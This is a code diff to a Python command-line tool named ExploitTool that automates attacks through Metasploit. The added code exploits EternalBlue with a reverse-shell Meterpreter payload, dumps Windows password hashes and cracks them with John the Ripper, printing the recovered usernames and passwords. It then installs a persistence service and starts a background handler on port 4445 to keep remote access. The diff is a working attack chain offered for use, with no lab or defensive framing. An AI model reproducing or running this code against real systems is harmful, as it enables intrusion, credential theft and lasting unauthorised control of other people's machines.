@@ -14,7 +14,8 @@ DEFAULT_CONFIG = {
     "output_dir": "exploit_output",
     "log_file": "exploit_log.log",
     "nmap_path": "nmap",
-    "msfconsole_path": "msfconsole"
+    "msfconsole_path": "msfconsole",
+    "default_lport": "4445"  # Default port for persistence
 }
 
 class ExploitTool(cmd.Cmd):
@@ -149,7 +150,7 @@ class ExploitTool(cmd.Cmd):
                     print(f"[!] Error: {hash_file} not found.")
                 else:
                     self.logger.info("[*] Starting John the Ripper to crack NT hashes with 2-minute timeout...")
-                    print("[*] Starting John the Ripper to crack NT hashes (will timeout after 2 minutes)...")
+                    print("[*] Cracking hashes with John the Ripper (2-minute timeout)...")
                     try:
                         # Start John process
                         process = subprocess.Popen(
@@ -162,32 +163,37 @@ class ExploitTool(cmd.Cmd):
                         # Wait for 2 minutes (120 seconds) or until process completes
                         try:
                             stdout, stderr = process.communicate(timeout=120)
-                            self.logger.info(f"[*] John completed within 2 minutes.")
-                            print(f"[*] John output:\n{stdout}")
-                            if stderr:
-                                self.logger.error(f"[!] John errors:\n{stderr}")
-                                print(f"[!] John errors:\n{stderr}")
-                            print("[*] Hash cracking completed. Use 'john --show clean_hashes.txt' to see cracked passwords.")
+                            # Extract passwords from John's output
+                            cracked_passwords = self.extract_passwords(stdout)
+                            if cracked_passwords:
+                                print("[*] Cracked Passwords:")
+                                for user, pwd in cracked_passwords.items():
+                                    print(f"{user}: {pwd}")
+                            else:
+                                print("[*] No passwords cracked within 2 minutes.")
                         except subprocess.TimeoutExpired:
                             self.logger.warning("[!] John took longer than 2 minutes. Terminating and showing partial results...")
-                            print("[!] Hash cracking took longer than 2 minutes. Stopping process...")
+                            print("[!] Hash cracking timed out after 2 minutes.")
                             process.kill()  # Terminate the process
                             stdout, stderr = process.communicate()  # Get any output up to this point
-                            if stdout:
-                                print(f"[*] Partial John output before timeout:\n{stdout}")
-                            if stderr:
-                                self.logger.error(f"[!] John errors before timeout:\n{stderr}")
-                                print(f"[!] John errors before timeout:\n{stderr}")
-                            # Show any cracked passwords so far
+                            # Extract passwords from partial output
+                            cracked_passwords = self.extract_passwords(stdout)
+                            if cracked_passwords:
+                                print("[*] Cracked Passwords:")
+                                for user, pwd in cracked_passwords.items():
+                                    print(f"{user}: {pwd}")
+                            else:
+                                print("[*] No passwords cracked within 2 minutes.")
+                            # Optionally show remaining hashes
                             show_result = subprocess.run(
                                 ["john", "--show", hash_file],
                                 capture_output=True,
                                 text=True
                             )
-                            if show_result.stdout:
-                                print(f"[*] Cracked passwords so far:\n{show_result.stdout}")
+                            if "0 password hashes cracked" in show_result.stdout:
+                                self.logger.info("[*] No additional passwords cracked.")
                             else:
-                                print("[*] No passwords cracked within 2 minutes.")
+                                self.logger.info("[*] Additional passwords may have been cracked; check manually with 'john --show clean_hashes.txt'.")
                         except Exception as e:
                             self.logger.error(f"[!] Error during John execution: {str(e)}")
                             print(f"[!] Error during John execution: {str(e)}")
@@ -204,6 +210,19 @@ class ExploitTool(cmd.Cmd):
         except Exception as e:
             self.logger.error(f"[!] An error occurred: {str(e)}")
             return
+
+    def extract_passwords(self, output):
+        """Extract usernames and passwords from John's output."""
+        passwords = {}
+        lines = output.split("\n")
+        for line in lines:
+            # Match lines with password and username, e.g., "P@ssw0rd         (Administrator)"
+            match = re.search(r'^\s*(\S+)\s+\((\S+)\)$', line.strip())
+            if match:
+                password = match.group(1)
+                username = match.group(2)
+                passwords[username] = password
+        return passwords
 
     def do_dump_hashes(self, dir_path):
         """Dump extracted hashes into a file in the provided directory"""
@@ -343,43 +362,108 @@ class ExploitTool(cmd.Cmd):
             return []
 
     def exploit_eternalblue(self, target_ip):
-        """Exploit EternalBlue and run extract.py to process hashes"""
+        """Exploit EternalBlue, dump hashes, establish persistence, and process hashes"""
         try:
-            # Use the working command with exit -y to ensure clean exit, deleting hashes file if it exists
+            # Step 1: Initial exploit and hashdump
             exploit_command = [
                 self.config['msfconsole_path'], '-q', '-x',
                 f"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target_ip}; set LHOST {self.local_ip}; "
                 f"set PAYLOAD windows/x64/meterpreter/reverse_tcp; exploit -z; "
-                f"rm hashes; spool hashes; sleep 5; sessions -i 1 -C hashdump; spool off; exit -y"
+                f"spool ~/hashes; sleep 5; sessions -i 1 -C hashdump; spool off; exit -y"
             ]
-            self.logger.debug(f"Running exploit command for {target_ip}: {' '.join(exploit_command)}")
+            self.logger.debug(f"Running initial exploit command for {target_ip}: {' '.join(exploit_command)}")
             self.logger.info(f"[*] Attempting to exploit {target_ip} and extract hashes...")
 
-            self.logger.debug(f"Launching subprocess for exploit on {target_ip}")
-            process = subprocess.Popen(
+            self.logger.debug(f"Launching subprocess for initial exploit on {target_ip}")
+            result = subprocess.run(
                 exploit_command,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True
+                capture_output=True,
+                text=True,
+                timeout=300
             )
+            self.logger.debug(f"Initial exploit subprocess completed for {target_ip}")
 
-            # Wait for the process to complete with a timeout
-            try:
-                stdout, stderr = process.communicate(timeout=300)
-                self.logger.debug(f"Exploit subprocess completed for {target_ip}")
-            except subprocess.TimeoutExpired:
-                self.logger.error(f"[!] Exploitation timed out for {target_ip}, killing process")
-                process.kill()
-                stdout, stderr = process.communicate()
-                raise
-
+            stdout = result.stdout
+            stderr = result.stderr
             self.logger.debug(f"Exploit output: {stdout}")
             if stderr:
                 self.logger.error(f"Exploit error output for {target_ip}: {stderr}")
 
-            self.logger.info(f"[*] Exploitation of {target_ip} completed")
+            self.logger.info("[*] Extracting hashes...")
+            hashes_found = False
+            for line in stdout.split("\n"):
+                if "Administrator" in line or "Admin" in line or ":$" in line:
+                    self.extracted_hashes.append(line.strip())
+                    self.logger.info(f"Found hash: {line.strip()}")
+                    hashes_found = True
 
-            # Call extract.py without arguments since it already handles the hashes file
+            if not hashes_found:
+                self.logger.warning(f"[!] No hashes found for {target_ip} in script output")
+            else:
+                self.logger.info(f"[*] Hashes also saved to ~/hashes")
+
+            # Extract session ID
+            session_id = None
+            for line in stdout.split("\n"):
+                if "Meterpreter session" in line and "opened" in line:
+                    match = re.search(r'Meterpreter session (\d+) opened', line)
+                    if match:
+                        session_id = match.group(1)
+                        self.logger.info(f"[*] Meterpreter session {session_id} opened for {target_ip}")
+                        break
+
+            if not session_id:
+                self.logger.warning(f"[!] No Meterpreter session created for {target_ip}")
+            else:
+                # Step 2: Establish persistence with the correct session ID
+                persistence_command = [
+                    self.config['msfconsole_path'], '-q', '-x',
+                    f"use exploit/windows/local/persistence_service; set SESSION {session_id}; set LHOST {self.local_ip}; "
+                    f"set LPORT {self.config.get('default_lport', '4445')}; set PAYLOAD windows/meterpreter/reverse_tcp; "
+                    f"run; exit -y"
+                ]
+                self.logger.debug(f"Running persistence command for {target_ip}: {' '.join(persistence_command)}")
+                self.logger.info(f"[*] Establishing persistent session on {target_ip} with session {session_id}...")
+
+                self.logger.debug(f"Launching subprocess for persistence on {target_ip}")
+                persistence_result = subprocess.run(
+                    persistence_command,
+                    capture_output=True,
+                    text=True,
+                    timeout=300
+                )
+                self.logger.debug(f"Persistence subprocess completed for {target_ip}")
+
+                self.logger.debug(f"Persistence output: {persistence_result.stdout}")
+                if persistence_result.stderr:
+                    self.logger.error(f"Persistence error output for {target_ip}: {persistence_result.stderr}")
+
+                if "Persistence service installed" in persistence_result.stdout:
+                    self.logger.info(f"[*] Persistence successfully established on {target_ip}")
+                else:
+                    self.logger.warning(f"[!] Failed to establish persistence on {target_ip}")
+
+                # Step 3: Set up the handler in the background
+                handler_command = [
+                    self.config['msfconsole_path'], '-q', '-x',
+                    f"use exploit/multi/handler; set LHOST {self.local_ip}; "
+                    f"set LPORT {self.config.get('default_lport', '4445')}; set PAYLOAD windows/meterpreter/reverse_tcp; "
+                    f"run -j; exit -y"
+                ]
+                self.logger.debug(f"Running handler command for {target_ip}: {' '.join(handler_command)}")
+                self.logger.info(f"[*] Setting up handler for persistent session on {target_ip}...")
+
+                self.logger.debug(f"Launching subprocess for handler on {target_ip}")
+                subprocess.Popen(
+                    handler_command,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    text=True
+                )
+                time.sleep(5)  # Give it time to start
+                self.logger.info(f"[*] Handler started for {target_ip} on LPORT {self.config.get('default_lport', '4445')}")
+
+            # Step 4: Process hashes with extract.py
             try:
                 self.logger.info(f"[*] Calling extract.py to process hashes")
                 subprocess.run(["python", "extract.py"], check=True)
@@ -388,6 +472,8 @@ class ExploitTool(cmd.Cmd):
                 self.logger.error(f"[!] Failed to run extract.py: {str(e)}")
             except Exception as e:
                 self.logger.error(f"[!] Unexpected error while running extract.py: {str(e)}")
+
+            self.logger.info(f"[*] Exploitation and persistence setup for {target_ip} completed")
 
         except subprocess.TimeoutExpired as e:
             self.logger.error(f"[!] Exploitation timed out for {target_ip}: {str(e)}")
